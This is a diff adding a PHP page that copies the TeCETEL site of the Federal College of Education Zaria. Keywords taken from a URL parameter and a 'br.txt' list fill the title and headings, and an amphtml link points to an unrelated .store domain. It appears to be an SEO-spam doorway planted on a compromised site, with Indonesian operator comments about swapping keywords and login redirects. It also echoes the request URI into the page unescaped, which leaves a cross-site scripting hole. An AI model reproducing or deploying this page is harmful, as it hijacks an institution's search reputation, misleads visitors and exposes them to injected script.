@@ -1,0 +1,416 @@
+<?php
+
+function feedback404()
+{
+    // header("HTTP/1.0 404 Not Found");
+    //echo "Menyala Abangku";
+    //get_included_files("xx.php");
+    include("main.php");
+}
+
+if (isset($_GET['page'])) {
+    $filename = "br.txt";
+    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
+    $target_string = strtolower($_GET['page']);
+
+    // Mengganti spasi menjadi strip untuk membandingkan
+    $urlkeyword = str_replace(' ', '-', $target_string);
+
+    foreach ($lines as $item) {
+        // Mengonversi spasi kembali menjadi strip untuk membandingkan
+        $item = str_replace(' ', '-', strtolower($item));
+        if ($item === $urlkeyword) {
+            $BRAND = strtoupper(str_replace('-', ' ', $urlkeyword));
+        }
+    }
+
+    if (isset($BRAND)) {
+        $BRANDS = $BRAND;
+        $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+        $fullUrl = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
+        if (isset($fullUrl)) {
+            $parsedUrl = parse_url($fullUrl);
+            $scheme = isset($parsedUrl['scheme']) ? $parsedUrl['scheme'] : '';
+            $host = isset($parsedUrl['host']) ? $parsedUrl['host'] : '';
+            $path = isset($parsedUrl['path']) ? $parsedUrl['path'] : '';
+            $query = isset($parsedUrl['query']) ? $parsedUrl['query'] : '';
+            $baseUrl = $scheme . "://" . $host . $path . '?' . $query;
+            $urlPath = $baseUrl;
+        } else {
+            echo "URL saat ini tidak didefinisikan.";
+        }
+    } else {
+        feedback404();
+        exit();
+    }
+} else {
+    feedback404();
+    exit();
+}
+
+/*
+* UNTUK KEYWORD SPASI
+<?php echo $BRANDS ?> 
+
+* GANTI URL PATH DENGAN INI
+<?php echo $urlPath ?>
+
+* UNTUK KEWORD-URL
+<?php echo $urlkeyword ?>
+
+* SAMA GANTI REDIRECT LOGIN/REGISTER
+
+*/
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta content="width=device-width, initial-scale=1.0" name="viewport">
+
+  <title>TeCETEL - <?php echo $BRANDS ?> </title>
+  <meta content="" name="description">
+  <meta content="" name="keywords">
+  <link rel="canonical" href="<?php echo $urlPath ?>" />
+  <link rel="amphtml" href="https://awokwako.awkokawy.store/bk0/?page=<?php echo $BRANDS ?> "/>
+  <!-- Favicons -->
+  <link href="assets/img/favicon.png" rel="icon">
+  <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i|Jost:300,300i,400,400i,500,500i,600,600i,700,700i|Poppins:300,300i,400,400i,500,500i,600,600i,700,700i" rel="stylesheet">
+
+  <!-- Vendor CSS Files -->
+  <link href="assets/vendor/aos/aos.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+  <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
+  <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
+  <link href="assets/vendor/glightbox/css/glightbox.min.css" rel="stylesheet">
+  <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
+  <link href="assets/vendor/swiper/swiper-bundle.min.css" rel="stylesheet">
+
+  <!-- Template Main CSS File -->
+  <link href="assets/css/style.css" rel="stylesheet">
+
+  <!-- =======================================================
+  * Template Name: Arsha
+  * Updated: Mar 10 2023 with Bootstrap v5.2.3
+  * Template URL: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/
+  * Author: BootstrapMade.com
+  * License: https://bootstrapmade.com/license/
+  ======================================================== -->
+</head>
+
+<body>
+
+  <!-- ======= Header ======= -->
+  <header id="header" class="fixed-top header-inner-pages">
+    <div class="container d-flex align-items-center">
+
+      <h1 class="logo me-auto"><a href="https://tecetel.fcezaria.edu.ng"><img src="assets/img/logo.png" />TeCETEL</a></h1>
+      <!-- Uncomment below if you prefer to use an image logo -->
+      <!-- <a href="index.html" class="logo me-auto"><img src="assets/img/logo.png" alt="" class="img-fluid"></a>-->
+
+      <nav id="navbar" class="navbar">
+        <ul>
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/">Home</a></li>
+          
+          <li class="dropdown active"><a href="<?php echo $urlPath ?>"><span><?php echo $BRANDS ?> </span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/leadership.html">Leadership</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/vission-mission.html">Vission and Mission</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/ranking.html">Ranking</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/history.html">History</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/campuses.html">Campuses</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/awards.html">Awards</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/news.html">News</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/health-safety.html">Health and Safety</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/alumni.html">Alumni</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/donations.html">Given/Donations</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/programmes.html">Academic Programmes</a></li>
+              <li><a class="nav-link scrollto" href="site-map">Site Map</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/faq.html">FAQ</a></li>
+            </ul>
+          </li>
+          <li class="dropdown"><a href="#"><span>Academics</span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/student.html">Student</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/admission.html">Admission</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/schools.html">Schools/Faculties</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/research.html">Researches</a></li>
+              <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/library.html">Libraries</a></li>
+              <li><a class="nav-link scrollto" href="chttps://tecetel.fcezaria.edu.ng/calender.html">Calander</a></li>
+            </ul>
+          </li>
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/courses.html">Courses</a></li>
+          <li class="dropdown"><a href="#"><span>Stakeholders</span> <i class="bi bi-chevron-down"></i></a>
+            <ul>
+              <li class="dropdown"><a href="#"><span>TETFund</span> <i class="bi bi-chevron-down"></i></a>
+                <ul>
+                  <li class="dropdown"><a href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/#"><span>Special Intervention</span> <i class="bi bi-chevron-down"></i></a>
+                    <ul>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/center-of-excellence/">Center of Excellence</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">High Impact Intervention</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">Zonal Intervention</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/disaster-recovery/">Disaster Recovery</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/">National Research Fund</a></li>
+                    </ul>
+                  </li>
+                  
+                  <li class="dropdown"><a href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/#"><span>Annual Intervention</span> <i class="bi bi-chevron-down"></i></a>
+                    <ul>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/physical-infrastructure-program/">Physical Infrastructure/Program Upgrade</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/academic-staff-training-development/">Academic Staff Training & Development</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/librarydevelopment/">Library Development</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/conference-attendance/">Conference Attendance</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/institution-based-research/">Institution-Based Research</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/teaching-practice/">Teaching Practice</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/annual-intervention/academic-research-journal/">Academic Research Journal</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/ict-support/">ICT Support</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/equipment-fabrication/">Equipment Fabrication</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/academic-manuscripts-development/">Academic Manuscript Development</a></li>
+                      <li><a class="nav-link scrollto" href="https://tetfund.gov.ng/index.php/special-intervention/entrepreneurship/">Entrepreneurship</a></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>              
+              <li class="dropdown"><a href="#"><span>Enterprises</span> <i class="bi bi-chevron-down"></i></a>
+                <ul>
+                  <li class="dropdown"><a href="#"><span>Journals</span> <i class="bi bi-chevron-down"></i></a>
+                    <ul>
+                      <li><a class="nav-link scrollto" href="http://zarjes.com/ZAJES">Zajes</a></li>
+                      <li><a class="nav-link scrollto" href="https://fcezaria.edu.ng/zajese/">Zajese</a></li>
+                    </ul>
+                  </li>
+                </ul>
+              </li>
+              <li><a class="nav-link scrollto" href="https://fcezaria.edu.ng">FCE Zaria</a></li>
+            </ul>
+          </li>
+          
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/news">News</a></li>
+          <li><a class="nav-link scrollto" href="https://tecetel.fcezaria.edu.ng/contact.html">Contact</a></li>
+          <li><a class="getstarted scrollto" href="tecetel.html">Documentation</a></li>
+        </ul>
+        <i class="bi bi-list mobile-nav-toggle"></i>
+      </nav><!-- .navbar -->
+
+    </div>
+  </header><!-- End Header -->
+
+  <main id="main">
+
+    <!-- ======= Breadcrumbs ======= -->
+    <section id="breadcrumbs" class="breadcrumbs">
+      <div class="container">
+
+        <ol>
+          <li><a href="https://tecetel.fcezaria.edu.ng">Home</a></li>
+          <li><?php echo $BRANDS ?> </li>
+        </ol>
+        <h2><?php echo $BRANDS ?> </h2>
+
+      </div>
+    </section><!-- End Breadcrumbs -->
+
+    <!-- ======= <?php echo $BRANDS ?>  Section ======= -->
+    <section id="about" class="about">
+      <div class="container">
+
+        <div class="section-title" data-aos="fade-up">
+          <h2><?php echo $BRANDS ?> </h2>
+        </div>
+
+        <div class="row content">
+          <div class="col-lg-6" data-aos="fade-up" data-aos-delay="150">
+            <p>
+              The Federal College of Education Zaria's Centre of Excellence is among the twelve TETFund Centre of Excellence inaugurated on the 24th November 2021. Its establishment is to bring to bear TETFund's paradigm shift from the traditional publication-oriented emphasis of project funding to focus on human resource development in the Tertiary Education Institutions (TEIs) system. 
+            </p>
+          </div>
+          <div class="col-lg-6 pt-4 pt-lg-0" data-aos="fade-up" data-aos-delay="300">
+            <p>
+              In tandem with the mandate of Nigeria Colleges of Education to produce well-motivated teachers of world-class quality through high personal and professional discipline, integrity, and competence for the expanding basic education sector, the Federal College of Education, Zaria, focuses on the impactful application of Information and Communication Technology resources for pedagogical development. 
+            </p>
+            <a href="tecetel.html#about" class="btn-learn-more">Read More</a>
+          </div>
+        </div>
+
+      </div>
+    </section><!-- End <?php echo $BRANDS ?>  Section -->
+    
+    <!-- ======= Contact Section ======= -->
+    <section id="contact" class="contact">
+      <div class="container" data-aos="fade-up">
+
+        <div class="section-title">
+          <h2>Contact</h2>
+          <p>Tetfund Centre of Excellence for Technology Enhanced Learning (TeCETEL) is domiciled in Federal College of Education, Zaria, Kaduna State-Nigeria.</p>
+        </div>
+
+        <div class="row">
+
+          <div class="col-lg-5 d-flex align-items-stretch">
+            <div class="info">
+              <div class="address">
+                <i class="bi bi-geo-alt"></i>
+                <h4>Location:</h4>
+                <p>Federal College of Education<br>P.M.B. 1041 Kongo, Zaria.</p>
+              </div>
+
+              <div class="email">
+                <i class="bi bi-envelope"></i>
+                <h4>Email:</h4>
+                <p>tecetel@fcezaria.edu.ng</p>
+              </div>
+
+              <div class="phone">
+                <i class="bi bi-phone"></i>
+                <h4>Call:</h4>
+                <p>+234 803 6417 979</p>
+              </div>
+
+              <iframe src="https://goo.gl/maps/wzxXUsWv9pUzto5T8" frameborder="0" style="border:0; width: 100%; height: 290px;" allowfullscreen></iframe>
+            </div>
+
+          </div>
+
+          <div class="col-lg-7 mt-5 mt-lg-0 d-flex align-items-stretch">
+            <form action="forms/contact.php" method="post" role="form" class="php-email-form">
+              <div class="row">
+                <div class="form-group col-md-6">
+                  <label for="name">Your Name</label>
+                  <input type="text" name="name" class="form-control" id="name" required>
+                </div>
+                <div class="form-group col-md-6">
+                  <label for="name">Your Email</label>
+                  <input type="email" class="form-control" name="email" id="email" required>
+                </div>
+              </div>
+              <div class="form-group">
+                <label for="name">Subject</label>
+                <input type="text" class="form-control" name="subject" id="subject" required>
+              </div>
+              <div class="form-group">
+                <label for="name">Message</label>
+                <textarea class="form-control" name="message" rows="10" required></textarea>
+              </div>
+              <div class="my-3">
+                <div class="loading">Loading</div>
+                <div class="error-message"></div>
+                <div class="sent-message">Your message has been sent. Thank you!</div>
+              </div>
+              <div class="text-center"><button type="submit">Send Message</button></div>
+            </form>
+          </div>
+
+        </div>
+
+      </div>
+    </section><!-- End Contact Section -->
+
+
+  </main><!-- End #main -->
+
+  <!-- ======= Footer ======= -->
+  <footer id="footer">
+
+    <div class="footer-newsletter">
+      <div class="container">
+        <div class="row justify-content-center">
+          <div class="col-lg-6">
+            <h4>Join Our Newsletter</h4>
+            
+            <form action="" method="post">
+              <input type="email" name="email"><input type="submit" value="Subscribe">
+            </form>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer-top">
+      <div class="container">
+        <div class="row">
+
+          <div class="col-lg-3 col-md-6 footer-contact">
+            <h3>TeCETEL</h3>
+            <p>
+              Federal College of Education<br>
+              P.M.B. 1041 Kongo, <br>
+              Zaria.<br><br>
+              <strong>Phone:</strong> +234 803 6417 979<br>
+              <strong>Email:</strong> tecetel@fcezaria.edu.ng<br>
+            </p>
+          </div>
+
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Useful Links</h4>
+            <ul>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng">Home</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="<?php echo $urlPath ?>"><?php echo $BRANDS ?> </a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/courses.html">Courses</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/ranking.html">Ranking</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tecetel.fcezaria.edu.ng/campuses.html">Campuses</a></li>
+            </ul>
+          </div>
+          
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Sponsors</h4>
+            <ul>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/center-of-excellence/">Center of Excellence</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">High Impact Intervention</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/zonal-intervention/">Zonal Intervention</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/disaster-recovery/">Disaster Recovery</a></li>
+              <li><i class="bx bx-chevron-right"></i> <a href="https://tetfund.gov.ng/index.php/annual-intervention/national-research-fund/">National Research Fund</a></li>
+            </ul>
+          </div>
+          
+          <div class="col-lg-3 col-md-6 footer-links">
+            <h4>Our Social Networks</h4>
+            <div class="social-links mt-3">
+              <a href="#" class="twitter"><i class="bx bxl-twitter"></i></a>
+              <a href="#" class="facebook"><i class="bx bxl-facebook"></i></a>
+              <a href="#" class="instagram"><i class="bx bxl-instagram"></i></a>
+              <a href="#" class="google-plus"><i class="bx bxl-skype"></i></a>
+              <a href="#" class="linkedin"><i class="bx bxl-linkedin"></i></a>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <div class="container footer-bottom clearfix">
+      <div class="copyright">
+        &copy; Copyright <strong>TeCETEL</strong>. All Rights Reserved
+      </div>
+      <div class="credits">
+        <!-- All the links in the footer should remain intact. -->
+        <!-- You can delete the links only if you purchased the pro version. -->
+        <!-- Licensing information: https://bootstrapmade.com/license/ -->
+        <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/arsha-free-bootstrap-html-template-corporate/ -->
+       
+      </div>
+    </div>
+  </footer><!-- End Footer -->
+
+  <div id="preloader"></div>
+  <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
+
+  <!-- Vendor JS Files -->
+  <script src="assets/vendor/aos/aos.js"></script>
+  <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
+  <script src="assets/vendor/glightbox/js/glightbox.min.js"></script>
+  <script src="assets/vendor/isotope-layout/isotope.pkgd.min.js"></script>
+  <script src="assets/vendor/swiper/swiper-bundle.min.js"></script>
+  <script src="assets/vendor/waypoints/noframework.waypoints.js"></script>
+  <script src="assets/vendor/php-email-form/validate.js"></script>
+
+  <!-- Template Main JS File -->
+  <script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
